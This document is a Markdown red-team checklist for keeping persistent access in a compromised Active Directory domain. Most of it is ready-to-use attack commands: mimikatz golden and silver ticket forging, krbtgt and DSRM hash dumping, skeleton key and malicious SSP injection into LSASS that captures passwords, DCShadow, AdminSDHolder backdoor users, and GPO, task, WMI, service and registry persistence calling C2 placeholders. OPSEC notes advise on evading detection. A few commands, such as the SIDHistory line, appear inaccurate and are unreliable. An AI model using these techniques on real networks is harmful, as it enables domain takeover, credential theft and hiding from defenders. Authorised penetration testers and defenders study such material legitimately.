# Persistence Checklist

## Golden Ticket

- [ ] Dump krbtgt hash: `mimikatz lsadump::dcsync /user:<domain>\krbtgt` — Need DA privileges
- [ ] Get domain SID: `Get-DomainSID` or `wmic useraccount get sid | findstr <domain>`
- [ ] Create golden ticket: `mimikatz kerberos::golden /user:Administrator /domain:<domain> /sid:<domain-sid> /krbtgt:<krbtgt-hash> /id:500 /ptt`
- [ ] Create golden ticket with custom user: `mimikatz kerberos::golden /user:User123 /domain:<domain> /sid:<domain-sid> /krbtgt:<krbtgt-hash> /id:500 /groups:512,513,519,518,512 /ptt` — Groups: Domain Admins (512), Schema Admins (518), Enterprise Admins (519)
- [ ] Create golden ticket for 10 year validity: `mimikatz kerberos::golden /user:Administrator /domain:<domain> /sid:<domain-sid> /krbtgt:<krbtgt-hash> /id:500 /renewmax:3650 /endin:3650 /ptt`
- [ ] Create golden ticket (non-DA user, but valid): Use any user's hash for stealth
- [ ] Use golden ticket with Rubeus: `Rubeus golden /rc4:<krbtgt-rc4> /user:Administrator /domain:<domain> /sid:<sid> /ptt`
- [ ] Test golden ticket: `dir \\<dc>\c$` — Should have access
- [ ] **OPSEC**: Golden ticket is undetectable by AD itself (no DC communication) — best persistence
- [ ] **OPSEC**: krbtgt hash rotation (every 30 days by default recommendation) invalidates golden tickets
- [ ] **OPSEC**: Only use golden ticket as last resort or when you have DA; krbtgt hash loss = permanent access

## Silver Ticket

- [ ] Dump service account NTLM hash: `mimikatz sekurlsa::logonpasswords` or `lsadump::dcsync /user:<domain>\<service-account>`
- [ ] Create silver ticket for CIFS: `mimikatz kerberos::golden /user:Administrator /domain:<domain> /sid:<domain-sid> /target:<target-server> /service:cifs /rc4:<service-hash> /ptt` — Access to files
- [ ] Create silver ticket for HOST: `mimikatz kerberos::golden /user:Administrator /domain:<domain> /sid:<domain-sid> /target:<target-server> /service:HOST /rc4:<service-hash> /ptt` — Schedule tasks
- [ ] Create silver ticket for HTTP: `mimikatz kerberos::golden /user:Administrator /domain:<domain> /sid:<domain-sid> /target:<target-server> /service:HTTP /rc4:<service-hash> /ptt`
- [ ] Create silver ticket for WSMAN: `mimikatz kerberos::golden /user:Administrator /domain:<domain> /sid:<domain-sid> /target:<target-server> /service:WSMAN /rc4:<service-hash> /ptt` — WinRM
- [ ] Create silver ticket for LDAP: `mimikatz kerberos::golden /user:Administrator /domain:<domain> /sid:<domain-sid> /target:<dc> /service:LDAP /rc4:<service-hash> /ptt` — DCSync via LDAP
- [ ] Create silver ticket for MSSQL: `mimikatz kerberos::golden /user:Administrator /domain:<domain> /sid:<domain-sid> /target:<sql-server> /service:MSSQLSvc /rc4:<service-hash> /ptt`
- [ ] **OPSEC**: Silver tickets are service-specific and avoid DC contact — very stealthy
- [ ] **OPSEC**: Silver ticket only works for that one service on that one server; no domain-wide access

## DSRM (Directory Services Restore Mode)

- [ ] Dump DSRM hash: `mimikatz lsadump::sam` on DC (SYSTEM required)
- [ ] Get DSRM password: `ntdsutil "set dsrm password" "sync from domain account <user>" q q` — This syncs DSRM to a DA password
- [ ] Use DSRM for persistence: Logon with DSRM account only works if target is in recovery mode — unless you change registry
- [ ] Enable DSRM logon for non-recovery: `reg add HKLM\System\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2` — Allows DSRM logon under normal mode
- [ ] DSRM PtH: `sekurlsa::pth /domain:<dc-name> /user:Administrator /ntlm:<dsrm-hash> /run:cmd.exe`
- [ ] **OPSEC**: DSRM logon change is a registry modification; Sysmon may detect
- [ ] **OPSEC**: DSRM is tied to the specific DC; works per-DC, not domain-wide

## Skeleton Key

- [ ] Inject skeleton key on DC: `mimikatz misc::skeleton` — Patches LSASS on DC to accept "mimikatz" as password
- [ ] Access with skeleton key: `net use \\<dc> /user:<domain>\Administrator mimikatz` — Any domain admin account works with password "mimikatz"
- [ ] **OPSEC**: Skeleton key modifies LSASS in memory — reboot clears it; EDR with LSASS monitoring will detect
- [ ] **OPSEC**: Requires DA privileges and must be run on DC every reboot; very risky

## DCShadow

- [ ] Register DC name for attack: `mimikatz lsadump::dcshadow /push /attribute:msDS-AllowedToActOnBehalfOfOtherIdentity /target:<target> /object:<object>`
- [ ] Setup DCShadow with local admin: Requires DA + local admin on a DC (or from DA session)
- [ ] Push malicious object attribute: `mimikatz lsadump::dcshadow /push /object:CN=<user>,CN=Users,DC=<domain>,DC=<tld> /attribute:servicePrincipalName /value:<malicious-spn>`
- [ ] Modify AdminSDHolder via DCShadow (stealthy persistence): Bypasses normal SDProp detection
- [ ] **OPSEC**: DCShadow simulates a DC (replication) — triggers event IDs 4662, 5136, and 4624 on DCs
- [ ] **OPSEC**: Very high detection risk; modern EDRs detect DC-registering behavior

## AdminSDHolder Persistence

- [ ] Check AdminSDHolder ACL: `Get-ObjectAcl -ADSpath "CN=AdminSDHolder,CN=System,DC=<domain>,DC=<tld>" -ResolveGUIDs`
- [ ] Add user to AdminSDHolder with DCSync rights: `Add-ObjectAcl -TargetADSprefix "CN=AdminSDHolder,CN=System,DC=<domain>,DC=<tld>" -PrincipalSamAccountName <user> -Rights DCSync`
- [ ] Create backdoor user (protected by AdminSDHolder): Once added, user "inherits" protection, survives cleanup
- [ ] **OPSEC**: AdminSDHolder modification is visible in AD; audit logs show who modified it
- [ ] **OPSEC**: If Blue Team audits AdminSDHolder, backdoor is clear

## SSP (Security Support Provider)

- [ ] Register malicious SSP: `mimikatz misc::memssp` — Injects SSP into LSASS; logs plaintext passwords to `c:\windows\temp`
- [ ] Permanent SSP via registry: `reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0<custom-ssp>"` — Loads on boot
- [ ] Write SSP DLL to system32: Place `ssp.dll` in `C:\Windows\System32\`
- [ ] **OPSEC**: SSP injection is LSASS patching — EDRs detect this
- [ ] **OPSEC**: Registry persistence is more stealthy but requires file + reboot

## Certificate-Based Persistence

- [ ] Request cert for alternative user (ESC1): If vulnerable template exists, get cert as Domain Admin
- [ ] Export CA private key: `mimikatz crypto::capi` / `crypto::certificates /export`
- [ ] Export CA certificate: `crypto::certificates /export /systemstore:local_machine`
- [ ] Use CA cert to sign arbitrary certificates: `mimikatz crypto::capi` + forge certs as needed
- [ ] Import malicious root CA: If user can AddLegacyDriver, install root CA for persistent man-in-the-middle
- [ ] **OPSEC**: Certificate requests are logged (event 4886/4887); CA key export triggers ETW

## GPO Persistence

- [ ] Modify GPO to add scheduled task: Add a logon task via GPO that calls back to C2
- [ ] Modify GPO startup script: `New-GPO -Name "UpdateTask"; Set-GPOStartupScript -Name "UpdateTask" -ScriptPath <script-path>`
- [ ] Add user to local admin via restricted groups: GPO's Restricted Groups to add backdoor user
- [ ] Link GPO to Domain Controllers OU: `New-GPLink -Name "<gpo>" -Target "ou=Domain Controllers,dc=<domain>,dc=<tld>"`
- [ ] **OPSEC**: GPO replication is logged; carefully select which GPO to modify (use existing, non-obvious ones)
- [ ] **OPSEC**: Startup scripts in GPO are visible in SYSVOL; use obfuscated scripts

## User Account Persistence

- [ ] Create hidden user: `net user <backdoor> <pass> /add /domain` — Obvious, use only if stealth not needed
- [ ] Create user with SPN for persistent access: `Set-DomainObject -Identity <user> -Set @{serviceprincipalname='http/legit'}`
- [ ] Disable pre-authentication on user: `Set-DomainObject -Identity <user> -Set @{useraccountcontrol=4194304}` — Persistent AS-REP roast target
- [ ] Add SID history to user: `mimikatz lsadump::dcsync /user:<domain>\<user> /sid:<enterprise-admin-sid>` — SIDHistory abuse for cross-domain
- [ ] Set alternate service password: `Set-ADAccountPassword -Identity <user> -NewPassword (ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force)`
- [ ] Modify user's `scriptPath`: `Set-ADUser <user> -ScriptPath <malicious-script>` — Logon script executes on next logon
- [ ] **OPSEC**: User creation events (4720) and password resets (4724) are logged

## Scheduled Task Persistence

- [ ] Create persistent scheduled task (runs as SYSTEM): `schtasks /create /tn "SystemCheck" /tr "<c2-launcher>" /sc onlogon /ru SYSTEM`
- [ ] Create task with trigger on event: `schtasks /create /tn "EventTask" /tr "<c2>" /sc onevent /mo "System[Provider[@Name='Microsoft-Windows-Kernel-General']]" /ru SYSTEM` — Triggers on system events
- [ ] Create daily task: `schtasks /create /tn "DailyTask" /tr "<c2>" /sc daily /st 09:00 /ru SYSTEM`
- [ ] **OPSEC**: Scheduled tasks are visible in Task Scheduler GUI and event logs (4698)

## WMI Event Subscription Persistence

- [ ] Create WMI event filter: `Register-CimIndicationEvent -Namespace root\cimv2 -Query "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'" -Action { <c2-call> }`
- [ ] Create WMI subscription for process creation: `Register-WmiEvent -Query "SELECT * FROM Win32_ProcessStartTrace" -Action { <execute> }`
- [ ] **OPSEC**: WMI persistence is deep and hard to find with standard tools; WMI Activity events (event 5861) in advanced audit can detect

## Service Persistence

- [ ] Create new service: `sc \\<target> create BackdoorService binpath= "<payload>" start= auto`
- [ ] Modify existing service: `sc \\<target> config <service> binpath= "<payload>"` — Less suspicious
- [ ] **OPSEC**: Service creation (7045) and modification (7045) are logged in System log

## Registry Run / RunOnce

- [ ] Add to Run key: `reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "<c2-path>"`
- [ ] Add to HKLM Run: `reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "<c2-path>"` — Runs at boot for all users
- [ ] **OPSEC**: Run keys are commonly checked by blue team; use obscure names

## Boot or Logon Initialization

- [ ] Startup folder: Place shortcut in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`
- [ ] All users startup: Place in `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\`
- [ ] **OPSEC**: Easy to detect; combine with file obfuscation and legitimate-looking names

## Domain Trust Persistence

- [ ] SIDHistory abuse across domains: Add SIDs from trusting domain to user in trusted domain — persistent cross-domain DA
- [ ] Create cross-forest trust account: If you have admin in two forests, setup malicious trust
- [ ] **OPSEC**: Trust modifications (event 4728) are logged; SIDHistory is visible in user attributes

## OPSEC Summary

| Technique | Stealth | Detection Risk | Impact |
|---|---|---|---|
| Golden Ticket | High (no DC contact) | Medium (if used heavily) | Full domain persistence |
| Silver Ticket | Very High | Low | Service-specific |
| DSRM | Medium | Medium | Per-DC persistence |
| Skeleton Key | Low | Very High | DA on DC |
| DCShadow | Low | Very High | Arbitrary AD modification |
| AdminSDHolder | Medium | Medium-High | Survives cleanup |
| SSP | Low | Very High | LSASS patch, password capture |
| Certificates | High | Medium | Long-lived auth |
| GPO | Medium | Medium-High | Broad coverage |
| WMI | High | Low-Medium | Hard to detect |
| Registry Run | Low | High | Common hunting target |

## Recommended Persistence Strategy

1. **Primary persistence (stealth)**: Golden ticket + Silver tickets for critical services (CIFS, HOST, LDAP on DCs)
2. **Secondary persistence (contingency)**: Certificate-based — export a DA cert for long-term auth
3. **Tertiary (fallback)**: AdminSDHolder backdoor user or WMI event subscription
4. **Avoid**: Skeleton key, DCShadow, SSP — too risky in modern environments
5. **Always**: Rotate the persistence if krbtgt hash changes (e.g., scheduled krbtgt rotation)
6. **Document**: Record all persistence methods; clean up on demand

## Persistence Cleanup

- [ ] Know all persistence methods used before cleanup
- [ ] Delete golden ticket (klist purge) and invalidate krbtgt (if you reset it)
- [ ] Delete any added users
- [ ] Revert AdminSDHolder changes
- [ ] Delete WMI subscriptions
- [ ] Remove registry run keys
- [ ] Delete scheduled tasks
- [ ] Remove service binaries
- [ ] **Important**: Always test persistence methods before relying on them in the actual engagement
